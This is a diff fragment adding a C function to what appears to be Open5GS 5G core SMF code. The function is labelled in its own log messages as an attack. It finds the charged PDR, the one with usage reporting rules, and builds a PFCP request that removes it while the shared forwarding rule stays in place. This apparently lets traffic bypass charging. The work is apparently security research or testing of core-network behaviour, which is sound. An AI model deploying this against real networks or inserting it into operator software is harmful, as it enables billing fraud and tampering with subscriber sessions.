+ogs_pkbuf_t *smf_n4_build_t2_a50_remove_charged_pdr(
+        uint8_t type, smf_sess_t *sess, ogs_pfcp_xact_t *xact)
+{
+    ogs_pfcp_message_t *pfcp_message = NULL;
+    ogs_pfcp_session_modification_request_t *req = NULL;
+    ogs_pfcp_pdr_t *pdr = NULL;
+    ogs_pfcp_pdr_t *charged_pdr = NULL;
+    ogs_pkbuf_t *pkbuf = NULL;
+    const char *flow_description = "permit out ip from any to assigned";
+
+    ogs_assert(sess);
+    ogs_assert(xact);
+
+    ogs_list_for_each(&sess->pfcp.pdr_list, pdr) {
+        int i;
+
+        for (i = 0; i < pdr->num_of_flow; i++) {
+            if (pdr->flow[i].description &&
+                strcmp(pdr->flow[i].description, flow_description) == 0 &&
+                pdr->num_of_urr > 0) {
+                charged_pdr = pdr;
+                break;
+            }
+        }
+        if (charged_pdr)
+            break;
+    }
+
+    if (!charged_pdr) {
+        ogs_error("selected-standard-scenario attack: charged PDR not found");
+        return NULL;
+    }
+
+    pfcp_message = ogs_calloc(1, sizeof(*pfcp_message));
+    if (!pfcp_message) {
+        ogs_error("ogs_calloc() failed");
+        return NULL;
+    }
+
+    req = &pfcp_message->pfcp_session_modification_request;
+    req->remove_pdr[0].presence = 1;
+    req->remove_pdr[0].pdr_id.presence = 1;
+    req->remove_pdr[0].pdr_id.u16 = charged_pdr->id;
+
+    pfcp_message->h.type = type;
+    pkbuf = ogs_pfcp_build_msg(pfcp_message);
+    ogs_expect(pkbuf);
+
+    ogs_warn("selected-standard-scenario attack: Remove PDR[%u] emitted; shared FAR retained",
+            charged_pdr->id);
+
+    ogs_free(pfcp_message);
+    return pkbuf;
+}
